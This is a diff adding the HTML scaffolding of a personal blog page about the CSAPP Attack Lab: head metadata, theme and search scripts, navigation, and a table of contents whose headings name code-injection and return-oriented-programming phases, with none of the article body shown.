@@ -1,0 +1,2772 @@
+<!doctype html>
+<!-- This site was created with Hugo Blox. https://hugoblox.com -->
+<!-- Last Published: March 28, 2025 --><html lang="en-us" dir="ltr"
+      data-wc-theme-default="system">
+  
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="generator" content="Hugo Blox Builder 0.3.1" />
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Zhidong Zhang" />
+
+  
+  
+  
+    
+  
+  <meta name="description" content="CSAPP第三次实验任务，转守为攻🗡️" />
+
+  
+  <link rel="alternate" hreflang="en-us" href="http://localhost:1313/post/csapp-attacklab/" />
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="/css/themes/emerald.min.css" />
+  
+
+  
+  
+    
+    <link href="/dist/wc.min.css" rel="stylesheet" />
+  
+
+  
+  
+  
+
+  
+
+  <script>
+     
+    window.hbb = {
+       defaultTheme: document.documentElement.dataset.wcThemeDefault,
+       setDarkTheme: () => {
+        document.documentElement.classList.add("dark");
+        document.documentElement.style.colorScheme = "dark";
+      },
+       setLightTheme: () => {
+        document.documentElement.classList.remove("dark");
+        document.documentElement.style.colorScheme = "light";
+      }
+    }
+
+    console.debug(`Default Hugo Blox Builder theme is ${window.hbb.defaultTheme}`);
+
+    if ("wc-color-theme" in localStorage) {
+      localStorage.getItem("wc-color-theme") === "dark" ? window.hbb.setDarkTheme() : window.hbb.setLightTheme();
+    } else {
+      window.hbb.defaultTheme === "dark" ? window.hbb.setDarkTheme() : window.hbb.setLightTheme();
+      if (window.hbb.defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? window.hbb.setDarkTheme() : window.hbb.setLightTheme();
+      }
+    }
+  </script>
+
+  <script>
+    
+    document.addEventListener('DOMContentLoaded', function () {
+      
+      let checkboxes = document.querySelectorAll('li input[type=\'checkbox\'][disabled]');
+      checkboxes.forEach(e => {
+        e.parentElement.parentElement.classList.add('task-list');
+      });
+
+      
+      const liNodes = document.querySelectorAll('.task-list li');
+      liNodes.forEach(nodes => {
+        let textNodes = Array.from(nodes.childNodes).filter(node => node.nodeType === 3 && node.textContent.trim().length > 1);
+        if (textNodes.length > 0) {
+          const span = document.createElement('label');
+          textNodes[0].after(span);  
+          span.appendChild(nodes.querySelector('input[type=\'checkbox\']'));
+          span.appendChild(textNodes[0]);
+        }
+      });
+    });
+  </script>
+
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+  <link rel="icon" type="image/png" href="/media/icon_hu_5cac115d14ed3d49.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/media/icon_hu_e7f327b39c12e7ca.png" />
+
+  <link rel="canonical" href="http://localhost:1313/post/csapp-attacklab/" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+
+  
+  
+    
+    
+  
+  <meta property="twitter:card" content="summary" />
+  
+    <meta property="twitter:site" content="@GetResearchDev" />
+    <meta property="twitter:creator" content="@GetResearchDev" />
+  
+  <meta property="og:site_name" content="ZhidongZhang 张志东" />
+  <meta property="og:url" content="http://localhost:1313/post/csapp-attacklab/" />
+  <meta property="og:title" content="CSAPP | Attack Lab (in Chinese) | ZhidongZhang 张志东" />
+  <meta property="og:description" content="CSAPP第三次实验任务，转守为攻🗡️" /><meta property="og:image" content="http://localhost:1313/media/icon_hu_645fa481986063ef.png" />
+    <meta property="twitter:image" content="http://localhost:1313/media/icon_hu_645fa481986063ef.png" /><meta property="og:locale" content="en-us" />
+  
+    
+      <meta
+        property="article:published_time"
+        content="2023-12-09T00:00:00&#43;00:00"
+      />
+    
+    <meta property="article:modified_time" content="2023-12-09T00:00:00&#43;00:00">
+  
+
+  
+
+
+
+  
+
+
+  <title>CSAPP | Attack Lab (in Chinese) | ZhidongZhang 张志东</title>
+
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <style>
+    @font-face {
+      font-family: 'Inter var';
+      font-style: normal;
+      font-weight: 100 900;
+      font-display: swap;
+      src: url(/dist/font/Inter.var.woff2) format(woff2);
+    }
+  </style>
+
+  
+
+  
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+  
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+  
+  
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        
+        
+      
+    
+      
+      
+    
+  
+
+
+
+
+
+
+
+<link type="text/css" rel="stylesheet" href="/dist/pagefind/pagefind-ui.be766eb419317a14ec769d216e9779bfe8f3737c80e780f4ba0dafb57a41a482.css" integrity="sha256-vnZutBkxehTsdp0hbpd5v&#43;jzc3yA54D0ug2vtXpBpII=" />
+
+
+<script src="/dist/pagefind/pagefind-ui.87693d7c6f2b3b347ce359d0ede762c033419f0a32b22ce508c335a81d841f1b.js" integrity="sha256-h2k9fG8rOzR841nQ7ediwDNBnwoysizlCMM1qB2EHxs="></script>
+
+
+<script>window.hbb.pagefind = {"baseUrl":"/"};</script>
+
+<style>
+  html.dark {
+    --pagefind-ui-primary: #eeeeee;
+    --pagefind-ui-text: #eeeeee;
+    --pagefind-ui-background: #152028;
+    --pagefind-ui-border: #152028;
+    --pagefind-ui-tag: #152028;
+  }
+</style>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    new PagefindUI({
+      element: "#search",
+      showSubResults: true,
+      baseUrl: window.hbb.pagefind.baseUrl,
+      bundlePath: window.hbb.pagefind.baseUrl + "pagefind/",
+    });
+  });
+  document.addEventListener('DOMContentLoaded', () => {
+    let element = document.getElementById('search');
+    let trigger = document.getElementById('search_toggle');
+
+    if (trigger) {
+      trigger.addEventListener('click', () => {
+        element.classList.toggle('hidden');
+        element.querySelector("input").value = ""
+        element.querySelector("input").focus()
+
+        if (!element.classList.contains('hidden')) {
+          let clear_trigger = document.querySelector('.pagefind-ui__search-clear');
+
+          if (clear_trigger && !clear_trigger.hasAttribute('listenerOnClick')) {
+            clear_trigger.setAttribute('listenerOnClick', 'true');
+
+            clear_trigger.addEventListener('click', () => {
+              element.classList.toggle('hidden');
+            });
+          }
+        }
+
+      });
+    }
+  });
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+  <script
+    defer
+    src="/js/hugo-blox-en.min.js"
+    integrity=""
+  ></script>
+
+  
+  
+
+
+
+
+
+
+
+
+  
+    
+      
+      <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+      
+    
+  
+
+
+
+
+</head>
+
+  <body class="dark:bg-hb-dark dark:text-white page-wrapper" id="top">
+    <div id="page-bg"></div>
+    <div class="page-header sticky top-0 z-30">
+      
+      
+      
+        
+        
+        
+          <header id="site-header" class="header">
+  <nav class="navbar px-3 flex justify-left">
+    <div class="order-0 h-100">
+      
+      <a class="navbar-brand" href="/" title="ZhidongZhang 张志东">
+        Zhidong Zhang
+      </a>
+    </div>
+    
+    <input id="nav-toggle" type="checkbox" class="hidden" />
+    <label
+      for="nav-toggle"
+      class="order-3 cursor-pointer flex items-center lg:hidden text-dark dark:text-white lg:order-1">
+      <svg id="show-button" class="h-6 fill-current block" viewBox="0 0 20 20">
+        <title>Open Menu</title>
+        <path d="M0 3h20v2H0V3z m0 6h20v2H0V9z m0 6h20v2H0V0z"></path>
+      </svg>
+      <svg id="hide-button" class="h-6 fill-current hidden" viewBox="0 0 20 20">
+        <title>Close Menu</title>
+        <polygon
+          points="11 9 22 9 22 11 11 11 11 22 9 22 9 11 -2 11 -2 9 9 9 9 -2 11 -2"
+          transform="rotate(45 10 10)"></polygon>
+      </svg>
+    </label>
+    
+
+    
+    
+    <ul
+      id="nav-menu"
+      class="navbar-nav order-3 hidden lg:flex w-full pb-6 lg:order-1 lg:w-auto lg:space-x-2 lg:pb-0 xl:space-x-8 justify-left
+      ">
+      
+      
+      
+      
+      
+      
+      <li class="nav-item">
+        <a
+          class="nav-link "
+          
+          href="/"
+        >Bio</a
+        >
+      </li>
+      
+      
+      
+      
+      
+      
+      <li class="nav-item">
+        <a
+          class="nav-link "
+          
+          href="/#papers"
+        >Papers</a
+        >
+      </li>
+      
+      
+      
+      
+      
+      
+      <li class="nav-item">
+        <a
+          class="nav-link "
+          
+          href="/#posts"
+        >Posts</a
+        >
+      </li>
+      
+      
+      
+      
+      
+      
+      <li class="nav-item">
+        <a
+          class="nav-link "
+          
+          href="/experience/"
+        >Experience</a
+        >
+      </li>
+      
+      
+      
+      
+      
+      
+      <li class="nav-item">
+        <a
+          class="nav-link "
+          
+          href="/projects/"
+        >Projects</a
+        >
+      </li>
+      
+      
+      
+    </ul>
+
+    <div class="order-1 ml-auto flex items-center md:order-2 lg:ml-0">
+
+      
+      
+      
+      <button
+        aria-label="search"
+        class="text-black hover:text-primary  inline-block px-3 text-xl dark:text-white"
+        id="search_toggle">
+        <svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 512 512" fill="currentColor"><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z"/></svg>
+      </button>
+      
+
+      
+      
+      <div class="px-3 text-black hover:text-primary-700 dark:text-white dark:hover:text-primary-300
+            [&.active]:font-bold [&.active]:text-black/90 dark:[&.active]:text-white">
+        <button class="theme-toggle mt-1" accesskey="t" title="appearance">
+          <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+               fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+               stroke-linejoin="round" class="dark:hidden">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+               fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+               stroke-linejoin="round" class=" dark:block [&:not(dark)]:hidden">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </button>
+      </div>
+      
+
+      
+      
+
+      
+      
+    </div>
+  </nav>
+</header>
+
+
+<div id="search" class="hidden p-3"></div>
+
+
+        
+      
+    </div>
+    <div class="page-body  my-10">
+      
+
+
+
+
+
+<div class="mx-auto flex max-w-screen-xl">
+  
+
+
+
+<aside class="hb-sidebar-container max-lg:[transform:translate3d(0,-100%,0)] lg:hidden xl:block">
+  
+  <div class="px-4 pt-4 lg:hidden">
+    
+    
+  </div>
+  <div class="hb-scrollbar lg:h-[calc(100vh-var(--navbar-height))]">
+    <ul class="flex flex-col gap-1 lg:hidden">
+      
+      
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/event/"
+    
+  >Recent &amp; Upcoming Talks
+        <span data-hb-sidebar-toggle>
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg>
+        </span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class="hb-sidebar-list"><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/event/example/"
+    
+  >Example Talk
+    </a>
+              
+            </li></ul>
+      </div></li>
+        <li class="open"><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/"
+    
+  >Blog
+        <span data-hb-sidebar-toggle>
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg>
+        </span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class="hb-sidebar-list"><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/texonvscode/"
+    
+  >LaTeX on VSCode (MacOS)
+    </a>
+              
+            </li><li class="flex flex-col open"><a
+    class="hb-sidebar-custom-link
+      sidebar-active-item bg-primary-100 font-semibold text-primary-800 dark:bg-primary-300 dark:text-primary-900"
+    href="/post/csapp-attacklab/"
+    
+  >CSAPP | Attack Lab (in Chinese)
+    </a>
+  
+    <ul class="hb-sidebar-mobile-toc"><li>
+              <a
+                href="#%e6%a6%82%e8%bf%b0"
+                class="hb-docs-link"
+              >概述</a>
+            </li>
+          <li>
+              <a
+                href="#part-i--code-injection-attacks"
+                class="hb-docs-link"
+              >Part I : &lt;strong&gt;Code Injection Attacks&lt;/strong&gt;</a>
+            </li>
+          <li>
+              <a
+                href="#part-ii--return-oriented-programming"
+                class="hb-docs-link"
+              >Part II : &lt;strong&gt;Return-Oriented Programming&lt;/strong&gt;</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/second-brain/"
+    
+  >🧠 Sharpen your thinking with a second brain
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/data-visualization/"
+    
+  >📈 Communicate your results effectively with the best data visualizations
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/teach-courses/"
+    
+  >👩🏼‍🏫 Teach academic courses
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/post/project-management/"
+    
+  >✅ Manage your projects
+    </a>
+              
+            </li></ul>
+      </div></li>
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/publication/"
+    
+  >Publications
+        <span data-hb-sidebar-toggle>
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg>
+        </span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class="hb-sidebar-list"><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/publication/crossmodalpoetrycreation/"
+    
+  >Large Model Based Crossmodal Chinese Poetry Creation
+    </a>
+              
+            </li></ul>
+      </div></li>
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/project/"
+    
+  >Projects
+        <span data-hb-sidebar-toggle>
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg>
+        </span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class="hb-sidebar-list"><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/project/poetrychat/"
+    
+  >PoetryChat
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/project/working-memory-capacity-of-rnn/"
+    
+  >The Working Memory Capacity of RNN
+    </a>
+              
+            </li></ul>
+      </div></li>
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/projects/"
+    
+  >Projects
+    </a></li>
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/experience/"
+    
+  >Research Experience
+    </a></li>
+        <li class=""><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/teaching/"
+    
+  >Teaching
+        <span data-hb-sidebar-toggle>
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg>
+        </span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class="hb-sidebar-list"><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/teaching/js/"
+    
+  >Learn JavaScript
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="hb-sidebar-custom-link
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50"
+    href="/teaching/python/"
+    
+  >Learn Python
+    </a>
+              
+            </li></ul>
+      </div></li>
+    </ul>
+
+    <div class="max-xl:hidden h-0 w-64 shrink-0"></div></div>
+
+</aside>
+  
+
+<nav class="hb-toc order-last hidden w-64 shrink-0 xl:block print:hidden px-4" aria-label="table of contents">
+  
+
+
+
+
+
+
+
+
+
+
+
+  <div class="hb-scrollbar text-sm [hyphens:auto] sticky top-16 overflow-y-auto pr-4 pt-6 max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] -mr-4 rtl:-ml-4"><p class="mb-4 font-semibold tracking-tight">On this page</p><ul>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a6%82%e8%bf%b0">概述</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#part-i--code-injection-attacks">Part I : Code Injection Attacks</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#phase1--level-1">Phase1  Level 1</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e4%bb%bb%e5%8a%a1">任务</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%80%9d%e8%b7%af">思路</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%84">栈结构</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b3">解决</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#phase-2-level-2">Phase 2 Level 2</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e4%bb%bb%e5%8a%a1-1">任务</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%80%9d%e8%b7%af-1">思路</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%84-1">栈结构</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b3-1">解决</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#phase-3-level-3">Phase 3 Level 3</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e4%bb%bb%e5%8a%a1-2">任务</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%80%9d%e8%b7%af-2">思路</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%84-2">栈结构</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b3-2">解决</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#part-ii--return-oriented-programming">Part II : Return-Oriented Programming</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#phase-4-level-2">Phase 4 Level 2</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e4%bb%bb%e5%8a%a1-3">任务</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%80%9d%e8%b7%af-3">思路</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%84-3">栈结构</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b3-3">解决</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#phase-5-level-3">Phase 5 Level 3</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e4%bb%bb%e5%8a%a1-4">任务</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%80%9d%e8%b7%af-4">思路</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%841">栈结构1</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b31">解决1</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e7%b2%97%e5%bf%83%e5%92%af">粗心咯！</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e6%a0%88%e7%bb%93%e6%9e%842">栈结构2</a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href="#%e8%a7%a3%e5%86%b32">解决2</a>
+      </li></ul>
+
+  
+  
+    
+    
+  
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
